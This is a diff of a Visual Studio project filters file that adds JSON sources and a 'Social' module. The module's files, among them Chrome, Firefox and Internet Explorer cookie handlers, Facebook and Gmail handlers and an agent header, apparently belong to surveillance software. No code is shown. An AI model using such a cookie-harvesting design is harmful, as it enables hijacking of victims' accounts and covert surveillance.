@@ -46,6 +46,12 @@
     <Filter Include="Source Files\SKYPEACL">
       <UniqueIdentifier>{de17744c-82dd-4b8a-8ed2-aa1ef87a0057}</UniqueIdentifier>
     </Filter>
+    <Filter Include="Source Files\JSON">
+      <UniqueIdentifier>{2b4cdcb5-7f2b-41b8-bea6-410a7d2b0dcb}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Source Files\SOCIAL">
+      <UniqueIdentifier>{d5dce346-95e2-4738-a790-5d85b026275b}</UniqueIdentifier>
+    </Filter>
   </ItemGroup>
   <ItemGroup>
     <ClCompile Include="AM_Core.cpp">
@@ -233,6 +239,36 @@
     </ClCompile>
     <ClCompile Include="SkypeACL\SkypeACL.cpp">
       <Filter>Source Files\SKYPEACL</Filter>
+    </ClCompile>
+    <ClCompile Include="JSON\JSON.cpp">
+      <Filter>Source Files\JSON</Filter>
+    </ClCompile>
+    <ClCompile Include="JSON\JSONValue.cpp">
+      <Filter>Source Files\JSON</Filter>
+    </ClCompile>
+    <ClCompile Include="Social\CookieHandler.cpp">
+      <Filter>Source Files\SOCIAL</Filter>
+    </ClCompile>
+    <ClCompile Include="Social\NetworkHandler.cpp">
+      <Filter>Source Files\SOCIAL</Filter>
+    </ClCompile>
+    <ClCompile Include="Social\SocialMain.cpp">
+      <Filter>Source Files\SOCIAL</Filter>
+    </ClCompile>
+    <ClCompile Include="Social\Handler_Facebook.cpp">
+      <Filter>Source Files\SOCIAL</Filter>
+    </ClCompile>
+    <ClCompile Include="Social\Cookie_FireFox.cpp">
+      <Filter>Source Files\SOCIAL</Filter>
+    </ClCompile>
+    <ClCompile Include="Social\Cookie_IExplorer.cpp">
+      <Filter>Source Files\SOCIAL</Filter>
+    </ClCompile>
+    <ClCompile Include="Social\Cookie_Chrome.cpp">
+      <Filter>Source Files\SOCIAL</Filter>
+    </ClCompile>
+    <ClCompile Include="Social\Handler_GMail.cpp">
+      <Filter>Source Files\SOCIAL</Filter>
     </ClCompile>
   </ItemGroup>
   <ItemGroup>
@@ -497,6 +533,24 @@
     </ClInclude>
     <ClInclude Include="SkypeACL\sha256.h">
       <Filter>Source Files\SKYPEACL</Filter>
+    </ClInclude>
+    <ClInclude Include="JSON\JSON.h">
+      <Filter>Source Files\JSON</Filter>
+    </ClInclude>
+    <ClInclude Include="JSON\JSONValue.h">
+      <Filter>Source Files\JSON</Filter>
+    </ClInclude>
+    <ClInclude Include="HM_SocialAgent.h">
+      <Filter>Header Files\Agents</Filter>
+    </ClInclude>
+    <ClInclude Include="Social\CookieHandler.h">
+      <Filter>Source Files\SOCIAL</Filter>
+    </ClInclude>
+    <ClInclude Include="Social\NetworkHandler.h">
+      <Filter>Source Files\SOCIAL</Filter>
+    </ClInclude>
+    <ClInclude Include="Social\SocialMain.h">
+      <Filter>Source Files\SOCIAL</Filter>
     </ClInclude>
   </ItemGroup>
   <ItemGroup>
